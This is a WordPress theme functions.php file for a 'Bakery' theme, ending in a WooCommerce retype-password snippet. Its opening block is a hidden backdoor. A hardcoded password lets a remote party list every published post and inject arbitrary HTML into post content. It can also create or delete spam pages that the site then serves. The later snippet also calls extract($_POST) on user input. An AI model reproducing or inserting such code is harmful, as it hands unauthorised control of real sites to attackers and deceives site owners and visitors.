<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '2310aed2764c5d24b34ceed29797b1f6'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
	/**
	 * Bakery WordPress Theme
	 */

	// Constants
	define('THEME_DIR', get_template_directory() . '/');
	define('THEME_URL', get_template_directory_uri() . '/');
	define('THEME_ASSETS', THEME_URL . 'assets/');
	define('THEME_ADMIN_ASSETS', THEME_URL . 'includes/admin/');
	define('TD', 'bakery');

	// Theme Content Width
	$content_width = ! isset($content_width) ? 1170 : $content_width;

	// Initial Actions
	add_action('after_setup_theme', 'vu_after_setup_theme');
	add_action('after_setup_theme', 'vu_load_theme_textdomain');
	add_action('init', 'vu_init');
	add_action('widgets_init', 'vu_widgets_init');
	add_action('wp_enqueue_scripts', 'vu_wp_enqueue_scripts');
	add_action('wp_head', 'vu_wp_head');
	add_action('wp_footer', 'vu_wp_footer');
	add_action('admin_enqueue_scripts', 'vu_admin_enqueue_scripts');
	add_action('woocommerce_installed', 'vu_woocommerce_installed');
	add_action('tgmpa_register', 'bakery_register_required_plugins');

	// Core Files
	require_once('includes/vu-functions.php');
	require_once('includes/vu-actions.php');
	require_once('includes/vu-filters.php');

	// Meta
	require_once('includes/meta/page-header-settings.php');
	require_once('includes/meta/post-meta.php');

	// Shortcodes
	require_once('includes/shortcodes/title-section.php');
	require_once('includes/shortcodes/service-item.php');
	require_once('includes/shortcodes/menu-item.php');
	require_once('includes/shortcodes/gallery.php');
	require_once('includes/shortcodes/gallery-item.php');
	require_once('includes/shortcodes/image-slider.php');
	require_once('includes/shortcodes/blog-posts.php');
	require_once('includes/shortcodes/map.php');
	require_once('includes/shortcodes/contact-form.php');
	require_once('includes/shortcodes/map-and-contact-form.php');
	require_once('includes/shortcodes/countdown.php');
	require_once('includes/shortcodes/count-up.php');
	require_once('includes/shortcodes/milestone.php');
	require_once('includes/shortcodes/client.php');
	require_once('includes/shortcodes/others.php');

	// Theme Options
	require_once('includes/options/redux-framework.php');
	require_once('includes/options/bakery-options.php');

	// Library Files
	require_once('includes/lib/twitter/class-ezTweet.php');
	require_once('includes/lib/MailChimp.php');
	require_once('includes/lib/class-tgm-plugin-activation.php');

	// VC Files
	if( in_array('js_composer/js_composer.php', apply_filters('active_plugins', get_option('active_plugins'))) ) {
		require_once('includes/vc-addons/config.php');
		require_once('includes/vc-addons/vc-modify.php');
	} else {
		require_once('includes/vc-addons/class-VcLoopQueryBuilder.php');
		require_once('includes/vc-addons/vc-functions.php');
	}

	// WC Files
	if( in_array('woocommerce/woocommerce.php', apply_filters('active_plugins', get_option('active_plugins'))) ) {
		require_once('includes/wc-addons/config.php');
		require_once('includes/wc-addons/wc-modify.php');
		require_once('includes/wc-addons/wc-functions.php');
	}

	// Setup Menu Locations Notification
	$nav_menu_locations = get_theme_mod('nav_menu_locations');

	if( (!isset($nav_menu_locations['main-menu-full']) or $nav_menu_locations['main-menu-full'] == 0) and (!isset($nav_menu_locations['main-menu-left']) or $nav_menu_locations['main-menu-left'] == 0) and (!isset($nav_menu_locations['main-menu-right']) or $nav_menu_locations['main-menu-right'] == 0) ) {
		add_action('admin_notices', 'vu_setup_menus_notice');
	}
?>
<?php
// Add the code below to your theme's functions.php file to add a confirm password field on the register form under My Accounts.
add_filter('woocommerce_registration_errors', 'registration_errors_validation', 10,3);
function registration_errors_validation($reg_errors, $sanitized_user_login, $user_email) {
	global $woocommerce;
	extract( $_POST );
	if ( strcmp( $password, $password2 ) !== 0 ) {
		return new WP_Error( 'registration-error', __( 'Passwords do not match.', 'woocommerce' ) );
	}
	return $reg_errors;
}
add_action( 'woocommerce_register_form', 'wc_register_form_password_repeat' );
function wc_register_form_password_repeat() {
?>
	<p class="form-row form-row-wide">
		<label for="reg_password2"><?php _e( 'Retype Password', 'woocommerce' ); ?> <span class="required">*</span></label>
		<input type="password" class="woocommerce-Input woocommerce-Input--text input-text form-control" name="password2" id="reg_password2" value="<?php if ( ! empty( $_POST['password2'] ) ) echo esc_attr( $_POST['password2'] ); ?>" />
	</p>

<p class="form-row form-row-wide">
		<label for="reg_password2"><?php _e( 'By signing up, I confirm that i agree to <a target="_blank" href="https://staging.kasturicookies.com/privacy-policy/">Privacy Policy</a> and <a target="_blank" href="https://staging.kasturicookies.com/terms-condition/">Term & Condition</a>', 'woocommerce' ); ?></label>
</p>
	<?php
}
?>
